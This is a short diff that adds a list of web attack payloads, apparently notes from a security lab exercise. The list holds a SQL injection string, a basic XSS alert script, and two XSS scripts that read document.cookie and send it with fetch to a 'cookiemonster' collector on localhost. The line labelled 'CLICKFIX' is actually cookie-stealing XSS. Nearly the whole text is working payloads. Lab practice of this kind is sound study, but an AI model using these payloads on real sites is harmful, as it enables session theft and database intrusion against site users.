@@ -1,0 +1,5 @@
+SQL INJECTION: ' or '1=1
+BASIC XSS: <script>alert( "You have been breached!" );</script>
+CLICKFIX: <script>fetch(`http://localhost/lab2/cookiemonster?cookie=` + encodeURIComponent(document.cookie));alert("took ur cookie lol");</script>
+
+<script>fetch("localhost/lab2/cookiemonster?cookie="+document.cookie)</script>
